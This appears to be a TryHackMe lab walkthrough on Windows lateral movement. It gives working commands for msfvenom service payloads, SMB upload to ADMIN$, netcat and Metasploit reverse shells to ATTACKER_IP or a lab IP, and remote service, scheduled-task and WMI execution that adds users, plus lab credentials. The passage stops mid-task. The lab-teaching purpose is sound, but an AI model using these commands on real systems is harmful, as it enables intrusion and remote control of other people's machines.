# Lateral Movement and Pivoting

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Network
Difficulty: Easy
Tags: Windows, Active Directory
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Premium
Description:
Learn about common techniques used to move laterally across a Windows network.
```

Room link: [https://tryhackme.com/room/lateralmovementandpivoting](https://tryhackme.com/room/lateralmovementandpivoting)

## Solution

### Network Layout

![Lateral Movement and Pivoting Network](Images/Lateral_Movement_and_Pivoting_Network.png)

### Task 1: Introduction

![Windows Logo](Images/Windows_Logo.png)

In this room, we will look at lateral movement, a group of techniques used by attackers to move around the network while creating as few alerts as possible. We'll learn about several common techniques used in the wild for this end and the tools involved.

It is recommended to go through the [Breaching AD](https://tryhackme.com/room/breachingad) and [Enumerating AD](https://tryhackme.com/room/adenumeration) rooms before this one.

#### Learning Objectives

- Familiarise yourself with the lateral movement techniques used by attackers.
- Learn how to use alternative authentication material to move laterally.
- Learn different methods to use compromised hosts as pivots.

#### Connecting to the Network

AttackBox

If you are using the Web-based AttackBox, you will be connected to the network automatically if you start the AttackBox from the room's page. You can verify this by running the ping command against the IP of the THMDC.za.tryhackme.com host. We do still need to configure DNS, however. Windows Networks use the Domain Name Service (DNS) to resolve hostnames to IPs. Throughout this network, DNS will be used for the tasks. You will have to configure DNS on the host on which you are running the VPN connection. In order to configure our DNS, run the following command:

```bash
[thm@thm]$ sed -i '1s|^|nameserver $THMDCIP\n|' /etc/resolv-dnsmasq
```

Remember to replace $THMDCIP with the IP of THMDC in your network diagram.

You can test that DNS is working by running:

`nslookup thmdc.za.tryhackme.com`

This should resolve to the IP of your DC.

**Note**: DNS may be reset on the AttackBox roughly every 3 hours. If this occurs, you will have to redo the command above. If your AttackBox terminates and you continue with the room at a later stage, you will have to redo all the DNS steps.

You should also take the time to make note of your VPN IP. Using `ifconfig` or `ip a`, make note of the IP of the lateralmovement network adapter. This is your IP and the associated interface that you should use when performing the attacks in the tasks.

Other Hosts

If you are going to use your own attack machine, an OpenVPN configuration file will have been generated for you once you join the room. Go to your access page. Select `Lateralmovementandpivoting` from the VPN servers (under the network tab) and download your configuration file.

![LatMov Pivot VPN Config](Images/LatMov_Pivot_VPN_Config.png)

Use an OpenVPN client to connect. This example is shown on a Linux machine; similar guides to connect using Windows or macOS can be found at your [access](https://tryhackme.com/r/access) page.

```bash
[thm@thm]$ sudo openvpn user-lateralmovementandpivoting.ovpn
Fri Mar 11 15:06:20 2022 OpenVPN 2.4.9 x86_64-redhat-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Apr 19 2020
Fri Mar 11 15:06:20 2022 library versions: OpenSSL 1.1.1g FIPS  21 Apr 2020, LZO 2.08
[....]
Fri Mar 11 15:06:22 2022 /sbin/ip link set dev lateralmovement up mtu 1500
Fri Mar 11 15:06:22 2022 /sbin/ip addr add dev lateralmovement 10.50.2.3/24 broadcast 10.50.2.255
Fri Mar 11 15:06:22 2022 /sbin/ip route add 10.200.4.0/24 metric 1000 via 10.50.2.1
Fri Mar 11 15:06:22 2022 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
Fri Mar 11 15:06:22 2022 Initialization Sequence Completed
```

The message "Initialization Sequence Completed" tells you that you are now connected to the network. Return to your access page. You can verify you are connected by looking on your access page. Refresh the page, and you should see a green tick next to Connected. It will also show you your internal IP address.

![LatMov Pivot VPN Connection](Images/LatMov_Pivot_VPN_Connection.png)

**Note**: You still have to configure DNS similar to what was shown above. It is important to note that although not used, the DC does log DNS requests. If you are using your machine, these logs may include the hostname of your device.

Kali

If you are using a Kali VM, Network Manager is most likely used as DNS manager. You can use GUI Menu to configure DNS:

- Network Manager -> Advanced Network Configuration -> Your Connection -> IPv4 Settings
- Set your DNS IP here to the IP for THMDC in the network diagram above
- Add another DNS such as 1.1.1.1 or similar to ensure you still have internet access
- Run `sudo systemctl restart NetworkManager` and test your DNS similar to the steps above.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ sudo systemctl restart NetworkManager
[sudo] password for kali: 

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ ping -c 3 thmdc.za.tryhackme.com
PING thmdc.za.tryhackme.com (10.200.74.101) 56(84) bytes of data.
64 bytes from 10.200.74.101: icmp_seq=1 ttl=127 time=23.2 ms
64 bytes from 10.200.74.101: icmp_seq=2 ttl=127 time=23.6 ms
64 bytes from 10.200.74.101: icmp_seq=3 ttl=127 time=24.0 ms

--- thmdc.za.tryhackme.com ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 23.153/23.587/24.043/0.363 ms
```

**Note**: When configuring your DNS in this way, the nslookup command won't work as expected. To test if you configured your DNS correctly, just navigate to `http://distributor.za.tryhackme.com/creds`. If you see the website, you are set up for the rest of the room.

#### Requesting Your Credentials

To simulate an AD breach, you will be provided with your first set of AD credentials. Once your networking setup has been completed, on your Attack Box, navigate to `http://distributor.za.tryhackme.com/creds` to request your credential pair. Click the "Get Credentials" button to receive your credential pair that can be used for initial access.

This credential pair will provide you SSH access to `THMJMP2.za.tryhackme.com`. THMJMP2 can be seen as a jump host into this environment, simulating a foothold that you have achieved.

For SSH access, you can use the following SSH command:

`ssh za.tryhackme.com\\<AD Username>@thmjmp2.za.tryhackme.com`

Your credentials have been generated:

- Username: `tony.holland`
- Password: `Mhvn2334`

#### A Note on Reverse Shells'

If you are using the AttackBox and have joined other network rooms before, be sure to select the IP address assigned to the tunnel interface facing the `lateralmovementandpivoting` network as your ATTACKER_IP, or else your reverse shells/connections won't work properly. For your convenience, the interface attached to this network is called `lateralmovement`, so you should be able to get the right IP address by running `ip add show lateralmovement`:

![LatMov Pivot IP Config](Images/LatMov_Pivot_IP_Config.png)

This will be helpful whenever needing to do a reverse connection back to your attacker machine throughout the room.

---------------------------------------------------------------------------

### Task 2: Moving Through the Network

#### What is Lateral Movement?

Simply put, lateral movement is the group of techniques used by attackers to move around a network. Once an attacker has gained access to the first machine of a network, moving is essential for many reasons, including the following:

- Reaching our goals as attackers
- Bypassing network restrictions in place
- Establishing additional points of entry to the network
- Creating confusion and avoid detection.

While many cyber kill chains reference lateral movement as an additional step on a linear process, it is actually part of a cycle. During this cycle, we use any available credentials to perform lateral movement, giving us access to new machines where we elevate privileges and extract credentials if possible. With the newfound credentials, the cycle starts again.

![Cyber Kill Chain](Images/Cyber_Kill_Chain.png)

Usually, we will repeat this cycle several times before reaching our final goal on the network. If our first foothold is a machine with very little access to other network resources, we might need to move laterally to other hosts that have more privileges on the network.

#### A Quick Example

Suppose we are performing a red team engagement where our final goal is to reach an internal code repository, where we got our first compromise on the target network by using a phishing campaign. Usually, phishing campaigns are more effective against non-technical users, so our first access might be through a machine in the Marketing department.

Marketing workstations will typically be limited through firewall policies to access any critical services on the network, including administrative protocols, database ports, monitoring services or any other that aren't required for their day to day labour, including code repositories.

To reach sensitive hosts and services, we need to move to other hosts and pivot from there to our final goal. To this end, we could try elevating privileges on the Marketing workstation and extracting local users' password hashes. If we find a local administrator, the same account may be present on other hosts. After doing some recon, we find a workstation with the name DEV-001-PC. We use the local administrator's password hash to access DEV-001-PC and confirm it is owned by one of the developers in the company. From there, access to our target code repository is available.

![Lateral Movement 1](Images/Lateral_Movement_1.png)

Notice that while lateral movement might need to be used to circumvent firewall restrictions, it is also helpful in evading detection. In our example, even if the Marketing workstation had direct access to the code repository, it is probably desirable to connect through the developer's PC. This behaviour would be less suspicious from the standpoint of a blue team analyst checking login audit logs.

#### The Attacker's Perspective

There are several ways in which an attacker can move laterally. The simplest way would be to use standard administrative protocols like WinRM, RDP, VNC or SSH to connect to other machines around the network. This approach can be used to emulate regular users' behaviours somewhat as long as some coherence is maintained when planning where to connect with what account. While a user from IT connecting to the web server via RDP might be usual and go under the radar, care must be taken not to attempt suspicious connections (e.g. why is the local admin user connecting to the DEV-001-PC from the Marketing-PC?).

Attackers nowadays also have other methods of moving laterally while making it somewhat more challenging for the blue team to detect what is happening effectively. While no technique should be considered infallible, we can at least attempt to be as silent as possible. In the following tasks, we will look at some of the most common lateral movement techniques available.

#### Administrators and UAC

While performing most of the lateral movement techniques introduced throughout the room, we will mainly use administrator credentials. While one might expect that every single administrator account would serve the same purpose, a distinction has to be made between two types of administrators:

- Local accounts part of the local Administrators group
- Domain accounts part of the local Administrators group

The differences we are interested in are restrictions imposed by **User Account Control (UAC)** over local administrators (except for the default Administrator account). By default, local administrators won't be able to remotely connect to a machine and perform administrative tasks unless using an interactive session through RDP. Windows will deny any administrative task requested via RPC, SMB or WinRM since such administrators will be logged in with a filtered medium integrity token, preventing the account from doing privileged actions. The only local account that will get full privileges is the default Administrator account.

Domain accounts with local administration privileges won't be subject to the same treatment and will be logged in with full administrative privileges.

This security feature can be disabled if desired, and sometimes you will find no difference between local and domain accounts in the administrator's group. Still, it's essential to keep in mind that should some of the lateral movement techniques fail, it might be due to using a non-default local administrator where UAC is enforced. You can read more details about this security feature [here](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction).

---------------------------------------------------------------------------

### Task 3: Spawning Processes Remotely

This task will look at the available methods an attacker has to spawn a process remotely, allowing them to run commands on machines where they have valid credentials. Each of the techniques discussed uses slightly different ways to achieve the same purpose, and some of them might be a better fit for some specific scenarios.

#### Psexec

- **Ports**: 445/TCP (SMB)
- **Required Group Memberships**: Administrators

Psexec has been the go-to method when needing to execute processes remotely for years. It allows an administrator user to run commands remotely on any PC where he has access. Psexec is one of many Sysinternals Tools and can be downloaded [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).

The way psexec works is as follows:

1. Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
2. Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with `C:\Windows\psexesvc.exe`.
3. Create some named pipes to handle stdin/stdout/stderr.

![PsExec Connection Overview](Images/PsExec_Connection_Overview.png)

To run psexec, we only need to supply the required administrator credentials for the remote host and the command we want to run (`psexec64.exe` is available under `C:\tools` in THMJMP2 for your convenience):

```bat
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

#### Remote Process Creation Using WinRM

- **Ports**: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships**: Remote Management Users

Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.

To connect to a remote Powershell session from the command line, we can use the following command:

```bat
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Once we have our PSCredential object, we can create an interactive session using the `Enter-PSSession` cmdlet:

```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell also includes the `Invoke-Command` cmdlet, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a PSCredential object as well:

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

#### Remotely Creating Services Using sc

- **Ports**:
  - 135/TCP, 49152-65535/TCP (DCE/RPC)
  - 139/TCP (RPC over SMB Named Pipes)
  - 445/TCP (RPC over SMB Named Pipes)
- **Required Group Memberships**: Administrators

Windows services can also be leveraged to run arbitrary commands since they execute a command when started. While a service executable is technically different from a regular application, if we configure a Windows service to run any application, it will still execute it and fail afterwards.

We can create a service on a remote host with sc.exe, a standard tool available in Windows. When using sc, it will try to connect to the Service Control Manager (SVCCTL) remote service program through RPC in several ways:

1. A connection attempt will be made using DCE/RPC. The client will first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535.

![Sc Connection 1](Images/Sc_Connection_1.png)

2. If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).

![Sc Connection 2](Images/Sc_Connection_2.png)

We can create and start a service named "THMservice" using the following commands:

```bat
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

The "net user" command will be executed when the service is started, creating a new local user on the system. Since the operating system is in charge of starting the service, you won't be able to look at the command output.

To stop and delete the service, we can then execute the following commands:

```bat
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

#### Creating Scheduled Tasks Remotely

Another Windows feature we can use is Scheduled Tasks. You can create and run one remotely with schtasks, available in any Windows installation. To create a task named THMtask1, we can use the following commands:

```bat
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 
```

We set the schedule type (`/sc`) to ONCE, which means the task is intended to be run only once at the specified time and date. Since we will be running the task manually, the starting date (`/sd`) and starting time (`/st`) won't matter much anyway.

Since the system will run the scheduled task, the command's output won't be available to us, making this a blind attack.

Finally, to delete the scheduled task, we can use the following command and clean up after ourselves:

```bat
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

#### Let's Get to Work

To complete this exercise, you will need to connect to THMJMP2 using the credentials assigned to you in Task 1 from `http://distributor.za.tryhackme.com/creds`. If you haven't done so yet, click on the link and get credentials now. Once you have your credentials, connect to THMJMP2 via SSH:

`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`

Your credentials have been generated:

- Username: `tony.holland`
- Password: `Mhvn2334`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ ssh za\\tony.holland@thmjmp2.za.tryhackme.com
The authenticity of host 'thmjmp2.za.tryhackme.com (10.200.74.249)' can't be established.
ED25519 key fingerprint is SHA256:hWJ3UXi9CUvCPJiW5DHV03g8j1fvIFqqI9WL79LPj3A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'thmjmp2.za.tryhackme.com' (ED25519) to the list of known hosts.
za\tony.holland@thmjmp2.za.tryhackme.com's password: 


Microsoft Windows [Version 10.0.14393] 
(c) 2016 Microsoft Corporation. All rights reserved. 

za\tony.holland@THMJMP2 C:\Users\tony.holland>    
```

For this exercise, we will assume we have already captured some credentials with administrative access:

- Username: `ZA.TRYHACKME.COM\t1_leonard.summers`
- Password: `EZpass4ever`

We'll show how to use those credentials to move laterally to THMIIS using `sc.exe`. Feel free to try the other methods, as they all should work against THMIIS.

While we have already shown how to use sc to create a user on a remote system (by using `net user`), we can also upload any binary we'd like to execute and associate it with the created service. However, if we try to run a reverse shell using this method, we will notice that the reverse shell disconnects immediately after execution. The reason for this is that service executables are different to standard .exe files, and therefore non-service executables will end up being killed by the service manager almost immediately. Luckily for us, msfvenom supports the exe-service format, which will encapsulate any payload we like inside a fully functional service executable, preventing it from getting killed.

To create a reverse shell, we can use the following command:

**Note**: Since you will be sharing the lab with others, you'll want to use a different filename for your payload instead of "myservice.exe" to avoid overwriting someone else's payload.

```bash
user@AttackBox$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```

We will then proceed to use t1_leonard.summers credentials to upload our payload to the ADMIN$ share of THMIIS using smbclient from our AttackBox:

```bash
user@AttackBox$ smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
 putting file myservice.exe as \myservice.exe (0.0 kb/s) (average 0.0 kb/s)
```

Once our executable is uploaded, we will set up a listener on the attacker's machine to receive the reverse shell from `msfconsole`:

```bash
user@AttackBox$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.10.10.16:4444
```

Alternatively, you can run the following one-liner on your Linux console to do the same:

```bash
user@AttackBox$ msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
```

Since `sc.exe` doesn't allow us to specify credentials as part of the command, we need to use `runas` to spawn a new shell with t1_leonard.summer's access token. Still, we only have SSH access to the machine, so if we tried something like `runas /netonly /user:ZA\t1_leonard.summers cmd.exe`, the new command prompt would spawn on the user's session, but we would have no access to it. To overcome this problem, we can use runas to spawn a second reverse shell with t1_leonard.summers access token:

```bat
C:\> runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```

**Note**: Remember that since you are using `runas` with the `/netonly` option, it will not bother to check if the provided credentials are valid (more info on this on the [Enumerating AD room](https://tryhackme.com/room/adenumeration)), so be sure to type the password correctly. If you don't, you will see some ACCESS DENIED errors later in the room.

We can receive the reverse shell connection using nc in our AttackBox as usual:

```bash
user@AttackBox$ nc -lvp 4443
```

And finally, proceed to create a new service remotely by using `sc`, associating it with our uploaded binary:

As t1_leonard.summers

```bat
C:\> sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
C:\> sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
```

Be sure to change the name of your service to avoid clashing with other students.

Once you have started the service, you should receive a connection in your AttackBox from where you can access the first flag on t1_leonard.summers desktop.

---------------------------------------------------------------------------

#### After running the "flag.exe" file on t1_leonard.summers desktop on THMIIS, what is the flag?

Create a reverse shell with `msfvenom` and transfer it to the IIS-server

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.150.74.4 LPORT=4444 -o cajac.exe    
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe-service file: 15872 bytes
Saved as: cajac.exe

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ smbclient -c 'put cajac.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
putting file cajac.exe as \cajac.exe (83.3 kb/s) (average 83.3 kb/s)
```

Create a first netcat listener on port 4443

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ nc -lvnp 4443 
listening on [any] 4443 ...

```

Start multi/handler on port 4444 to receive second reverse shell

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/shell/reverse_tcp
LHOST => lateralmovement
LPORT => 4444
[*] Started reverse TCP handler on 10.150.74.4:4444 
```

At the SSH session, trigger the first reverse shell

```bat
za\tony.holland@THMJMP2 C:\Users\tony.holland>runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.150.74.4 4443"
Enter the password for ZA.TRYHACKME.COM\t1_leonard.summers: 
Attempting to start c:\tools\nc64.exe -e cmd.exe 10.150.74.4 4443 as user "ZA.TRYHACKME.COM\t1_leonard.summers" ... 

za\tony.holland@THMJMP2 C:\Users\tony.holland>   
```

Back at the netcat listener, we start a service on the IIS-server that will spawn a second reverse shell

```bat
C:\Windows\system32> sc.exe \\thmiis.za.tryhackme.com create CajacService binPath= "%windir%\cajac.exe" start= auto 
sc.exe \\thmiis.za.tryhackme.com create CajacService binPath= "%windir%\cajac.exe" start= auto
[SC] CreateService SUCCESS

C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com start CajacService
sc.exe \\thmiis.za.tryhackme.com start CajacService

SERVICE_NAME: CajacService 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 4  RUNNING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 5624
        FLAGS              : 

C:\Windows\system32>
```

At the multi/handler we now have a connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/shell/reverse_tcp
LHOST => lateralmovement
LPORT => 4444
[*] Started reverse TCP handler on 10.150.74.4:4444 
[*] Sending stage (240 bytes) to 10.200.74.201
[*] Command shell session 1 opened (10.150.74.4:4444 -> 10.200.74.201:51039) at 2026-04-30 16:10:34 +0200


Shell Banner:
Microsoft Windows [Version 10.0.17763.1098]
-----
 

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
THMIIS

C:\Windows\system32>cd c:\users\ 
cd c:\users\

c:\Users>dir
dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of c:\Users

2026/04/30  14:09    <DIR>          .
2026/04/30  14:09    <DIR>          ..
2022/02/27  11:45    <DIR>          .NET v2.0
2022/02/27  11:45    <DIR>          .NET v2.0 Classic
2022/02/27  11:45    <DIR>          .NET v4.5
2022/02/27  11:45    <DIR>          .NET v4.5 Classic
2022/02/28  22:15    <DIR>          Administrator
2022/04/30  08:41    <DIR>          Administrator.ZA
2022/02/27  11:45    <DIR>          Classic .NET AppPool
2020/03/21  21:25    <DIR>          Public
2022/03/06  19:53    <DIR>          svcFileCopy
2022/04/27  17:34    <DIR>          t1_corine.waters
2022/04/27  17:27    <DIR>          t1_leonard.summers
2026/04/30  14:50    <DIR>          t1_thomas.moore
2022/04/27  17:46    <DIR>          t1_toby.beck
2026/04/30  14:09    <DIR>          t1_toby.beck1
2022/03/20  15:54    <DIR>          vagrant
               0 File(s)              0 bytes
              17 Dir(s)  46�547�189�760 bytes free

c:\Users>cd t1_leonard.summers\Desktop
cd t1_leonard.summers\Desktop

c:\Users\t1_leonard.summers\Desktop>dir
dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of c:\Users\t1_leonard.summers\Desktop

2022/06/17  18:41    <DIR>          .
2022/06/17  18:41    <DIR>          ..
2022/06/17  18:40            58�368 Flag.exe
               1 File(s)         58�368 bytes
               2 Dir(s)  46�547�189�760 bytes free

c:\Users\t1_leonard.summers\Desktop>Flag.exe
Flag.exe
THM{<REDACTED>}


c:\Users\t1_leonard.summers\Desktop>
```

Answer: `THM{<REDACTED>}`

Finally, we clean up at the first reverse shell

```bat
C:\Windows\system32> sc.exe \\thmiis.za.tryhackme.com stop CajacService
sc.exe \\thmiis.za.tryhackme.com stop CajacService
[SC] ControlService FAILED 1062:

The service has not been started.


C:\Windows\system32> sc.exe \\thmiis.za.tryhackme.com delete CajacService
sc.exe \\thmiis.za.tryhackme.com delete CajacService
[SC] DeleteService SUCCESS

C:\Windows\system32>
```

---------------------------------------------------------------------------

### Task 4: Moving Laterally Using VMI

We can also perform many techniques discussed in the previous task differently by using Windows Management Instrumentation (WMI). WMI is Windows implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices.

In simpler terms, WMI allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement in various ways, which we'll discuss.

#### Connecting to WMI From Powershell

Before being able to connect to WMI using Powershell commands, we need to create a PSCredential object with our user and password. This object will be stored in the $credential variable and utilised throughout the techniques on this task:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

We then proceed to establish a WMI session using either of the following protocols:

- **DCOM**: RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
- **Wsman**: WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

To establish a WMI session from Powershell, we can use the following commands and store the session on the $Session variable, which we will use throughout the room on the different techniques:

```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

The `New-CimSessionOption` cmdlet is used to configure the connection options for the WMI session, including the connection protocol. The options and credentials are then passed to the `New-CimSession` cmdlet to establish a session against a remote host.

#### Remote Process Creation Using WMI

- **Ports**:
  - 135/TCP, 49152-65535/TCP (DCERPC)
  - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships**: Administrators

We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before:

```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

Notice that WMI won't allow you to see the output of any command but will indeed create the required process silently.

On legacy systems, the same can be done using wmic from the command prompt:

```bat
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
```

#### Creating Services Remotely with WMI

- **Ports**:
  - 135/TCP, 49152-65535/TCP (DCERPC)
  - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships**: Administrators

We can create services with WMI through Powershell. To create a service called THMService2, we can use the following command:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

And then, we can get a handle on the service and start it with the following commands:

```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Finally, we can stop and delete the service with the following commands:

```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

#### Creating Scheduled Tasks Remotely with WMI

- **Ports**:
  - 135/TCP, 49152-65535/TCP (DCERPC)
  - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships**: Administrators

We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:

```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

To delete the scheduled task after it has been used, we can use the following command:

```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

#### Installing MSI packages through WMI

- **Ports**:
  - 135/TCP, 49152-65535/TCP (DCERPC)
  - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships**: Administrators

MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

We can achieve the same by us using wmic in legacy systems:

```powershell
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

#### Let's Get to Work

To complete this exercise, you will need to connect to THMJMP2 using the credentials assigned to you on Task 1 from `http://distributor.za.tryhackme.com/creds`. If you haven't done so yet, click on the link and get credentials. Once you have your credentials, connect to THMJMP2 via SSH:

`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`

Your credentials have been generated:

- Username: `tony.holland`
- Password: `Mhvn2334`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ ssh za\\tony.holland@thmjmp2.za.tryhackme.com
The authenticity of host 'thmjmp2.za.tryhackme.com (10.200.74.249)' can't be established.
ED25519 key fingerprint is SHA256:hWJ3UXi9CUvCPJiW5DHV03g8j1fvIFqqI9WL79LPj3A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'thmjmp2.za.tryhackme.com' (ED25519) to the list of known hosts.
za\tony.holland@thmjmp2.za.tryhackme.com's password: 


Microsoft Windows [Version 10.0.14393] 
(c) 2016 Microsoft Corporation. All rights reserved. 

za\tony.holland@THMJMP2 C:\Users\tony.holland>    
```

For this exercise, we will assume we have already captured some credentials with administrative access:

- Username: `ZA.TRYHACKME.COM\t1_corine.waters`
- Password: `Korine.1994`

We'll show how to use those credentials to move laterally to THM-IIS using WMI and MSI packages. Feel free to try the other methods presented during this task.

We will start by creating our MSI payload with msfvenom from our attacker machine:

